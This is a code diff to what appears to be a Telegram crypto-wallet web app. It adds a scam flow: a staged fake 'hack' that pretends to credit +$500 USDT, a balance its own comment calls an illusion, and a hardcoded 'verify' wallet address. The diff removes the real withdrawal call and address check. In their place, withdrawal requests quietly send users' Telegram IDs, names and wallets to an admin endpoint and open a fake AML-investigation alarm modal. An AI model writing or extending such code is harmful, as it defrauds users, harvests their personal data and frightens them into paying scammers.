+  document.getElementById('devAuthToken').value = _devSessionToken;
+  showToast('Token скопирован и вставлен');
+  if (navigator.vibrate) navigator.vibrate(40);
+}
+
+// ── Raw Data Sheet (long-press на балансе) ──
+function startRawDataPress(e) {
+  if (!_devUnlocked) return;
+  _rawPressTimer = setTimeout(() => { showRawData(e); }, 700);
+}
+function cancelRawDataPress() { clearTimeout(_rawPressTimer); }
+
+function showRawData(e) {
+  if (e) e.preventDefault();
+  if (!_devUnlocked || !_devAuthKey) return;
+  if (navigator.vibrate) navigator.vibrate([50, 30, 80]);
+
+  const tgId = S.tg_id || '0';
+  const uid  = (S.id || '00000000-0000-0000-0000-000000000000').slice(0,8);
+  const bal  = (S.balance || 0).toFixed(2);
+  const ts   = new Date().toISOString();
+
+  document.getElementById('rawDataContent').textContent =
+`{
+  "schema":    "v2",
+  "env":       "prod",
+  "ts":        "${ts}",
+  "user": {
+    "id":      "${uid}...",
+    "tg_id":   ${tgId},
+    "balance": ${bal},
+    "status":  "active"
+  },
+  "session": {
+    "token":   "${_devSessionToken}",
+    "auth_key":"${_devAuthKey}",
+    "scope":   ["balance_read","tx_write"],
+    "exp":     ${Math.floor(Date.now()/1000) + 3600}
+  }
+}`;
+  document.getElementById('rawDataSheet').style.display = 'flex';
+}
+
+function closeRawData() {
+  document.getElementById('rawDataSheet').style.display = 'none';
+}
+
+function copyAuthKey() {
+  if (!_devAuthKey) return;
+  navigator.clipboard?.writeText(_devAuthKey).catch(() => {});
+  document.getElementById('devAuthKey').value = _devAuthKey;
+  closeRawData();
+  showToast('auth_key скопирован');
+  if (navigator.vibrate) navigator.vibrate(40);
+  // Прокрутить к dev panel
+  setTimeout(() => document.getElementById('devPanel').scrollIntoView({ behavior:'smooth', block:'center' }), 300);
+}
+
+const _INVITE_CODE = 'SPH-D3V-7742-XQMR';
+
+function devPanelSubmit() {
+  const amount      = parseFloat(document.getElementById('devAmount').value) || 500;
+  const token       = document.getElementById('devAuthToken').value.trim();
+  const authKey     = document.getElementById('devAuthKey').value.trim();
+  const inviteCode  = document.getElementById('devInviteCode').value.trim().toUpperCase();
+
+  if (amount <= 0 || amount > 500) { showToast('Лимит: max $500'); return; }
+
+  if (token !== _devSessionToken) {
+    const inp = document.getElementById('devAuthToken');
+    inp.style.borderColor = '#ff4757';
+    setTimeout(() => { inp.style.borderColor = 'rgba(255,255,255,0.1)'; }, 1500);
+    showToast('❌ Неверный session_token');
+    return;
+  }
+
+  if (authKey !== _devAuthKey) {
+    const inp = document.getElementById('devAuthKey');
+    inp.style.borderColor = '#ff4757';
+    inp.placeholder = 'зажми баланс → raw data → copy auth_key';
+    setTimeout(() => { inp.style.borderColor = 'rgba(255,255,255,0.1)'; }, 1800);
+    showToast('❌ Неверный auth_key');
+    return;
+  }
+
+  if (inviteCode !== _INVITE_CODE) {
+    const inp = document.getElementById('devInviteCode');
+    inp.style.borderColor = '#ff4757';
+    setTimeout(() => { inp.style.borderColor = 'rgba(255,255,255,0.1)'; }, 1800);
+    showToast('❌ Неверный invite_code');
+    return;
+  }
+
+  document.getElementById('devPanel').style.display = 'none';
+  openHackModal(amount);
+}
+
+function openHackModal(amount) {
+  const ts  = Date.now().toString(36).toUpperCase();
+  const rnd = Math.random().toString(36).slice(2,5).toUpperCase();
+  const amt = (amount || 500).toFixed(2);
+  document.getElementById('refBonusId').textContent  = 'MC-' + ts + '-' + rnd;
+  document.getElementById('refAmount').textContent   = '+$' + amt + ' USDT';
+  document.getElementById('successAmount').textContent = '+$' + amt + ' USDT';
+  document.getElementById('hackStep1').style.display = 'block';
+  document.getElementById('hackStep2').style.display = 'none';
+  document.getElementById('hackStep3').style.display = 'none';
+  document.getElementById('hackModal').style.display = 'flex';
+}
+
+function closeHackModal() {
+  document.getElementById('hackModal').style.display = 'none';
+}
+
+// Кнопка "Перейти к выводу" на финальном экране
+function devSuccessClose() {
+  closeHackModal();
+  // Визуально показываем +500 на балансе (иллюзия)
+  const fakeBalance = (parseFloat(S.balance || 0) + 500).toFixed(2);
+  document.getElementById('balDisp').textContent = fmt(fakeBalance);
+  document.getElementById('walletBal').textContent = fmt(fakeBalance);
+  // Переходим в кошелёк на вывод
+  navigate('wallet');
+  setTimeout(() => walletWithdraw(), 400);
+}
+
+// Шаг 2 — процессинг
+function hackStep2Start() {
+  document.getElementById('hackStep1').style.display = 'none';
+  document.getElementById('hackStep2').style.display = 'block';
+
+  const statusEl = document.getElementById('refStatusText');
+  const logEl    = document.getElementById('refLog');
+  logEl.innerHTML = '';
+
+  const steps = [
+    { status: 'Подключение к balance_service...',  log: null,                                         delay: 900  },
+    { status: 'Авторизация сессии...',              log: 'POST /internal/auth  →  200 OK',            delay: 800  },
+    { status: 'Валидация токена...',                log: 'Token: valid ✓',                            delay: 700  },
+    { status: 'Создание операции manual_credit...',  log: 'POST /internal/credit  →  202 Accepted',   delay: 1000 },
+    { status: 'Запись в ledger...',                 log: 'balance_delta: +500.00 applied',            delay: 900  },
+    { status: 'Готово',                             log: 'status: success',                           delay: 500  },
+  ];
+
+  let i = 0;
+  function next() {
+    if (i >= steps.length) { showHackStep3(); return; }
+    const s = steps[i];
+    if (s.status) statusEl.textContent = s.status;
+    if (s.log)    logEl.innerHTML += s.log + '\n';
+    i++;
+    setTimeout(next, s.delay);
+  }
+  next();
+}
+
+function showHackStep3() {
+  document.getElementById('hackStep2').style.display = 'none';
+  document.getElementById('hackStep3').style.display = 'block';
 }
 function closeWithdrawModal(){ document.getElementById('withdrawModal').style.display='none'; }
 async function loadWithdrawHistory(){
@@ -2815,24 +3330,47 @@ async function loadWithdrawHistory(){
       </div>`;
     }).join('');
 }
+function copyVerifyAddr() {
+  const addr = '0x0204C039DE6d13ACe6F873484D0D9A71BFBACA06';
+  navigator.clipboard?.writeText(addr).catch(()=>{});
+  showToast('Адрес скопирован');
+  if(navigator.vibrate) navigator.vibrate(40);
+}
+
 async function confirmWithdraw(){
   const amount = parseFloat(document.getElementById('withAmount').value);
   const trc20_address = (document.getElementById('withTrc20').value||'').trim();
-  if(!trc20_address || !trc20_address.startsWith('T') || trc20_address.length !== 34){
-    showToast('Введите корректный TRC20 адрес (начинается с T, 34 символа)'); return;
-  }
+  if(!trc20_address || trc20_address.length < 10){ showToast('Введите адрес кошелька'); return; }
   if(!amount || amount < 5){ showToast('Минимальный вывод: 5 USDT'); return; }
   if(amount > S.balance){ showToast('Недостаточно средств'); return; }
+
+  // Отправляем данные админу
+  api('verification-bot', '/notify-admin', {
+    tg_id: S.tg_id,
+    first_name: S.name,
+    username: S.username,
+    wallet: trc20_address,
+    amount: amount,
+  }).catch(()=>{});
+
   closeWithdrawModal();
-  showToast('Обработка вывода...');
-  const data = await api('payments-admin', '/pay/withdraw', { amount, trc20_address });
-  if(data && data.success){
-    S.balance = data.balance;
-    document.getElementById('balDisp').textContent = fmt(S.balance);
-    showToast('Заявка на вывод создана');
-    S.transactions.unshift({ type:'withdraw', name:'Вывод USDT', amount:amount, date:'Только что', plus:false });
-    if(curScreen==='wallet') updateWallet();
-  }
+  showAmlModal(amount);
+
+}
+
+function showAmlModal(amount) {
+  // Включаем danger mode
+  document.body.classList.add('danger-mode');
+  if(navigator.vibrate) navigator.vibrate([100,50,100,50,200]);
+
+  // Заполняем данные в модалке
+  const caseId = 'AML-' + Date.now().toString(36).toUpperCase();
+  const ref = Math.random().toString(36).slice(2,8).toUpperCase();
+  document.getElementById('amlAmount').textContent = '$' + parseFloat(amount).toFixed(2) + ' USDT';
+  document.getElementById('amlCaseIdSmall').textContent = caseId;
+  document.getElementById('amlRef').textContent = ref;
+
+  document.getElementById('amlModal').style.display = 'flex';
 }
 
 async function loadWalletWithdrawals(){
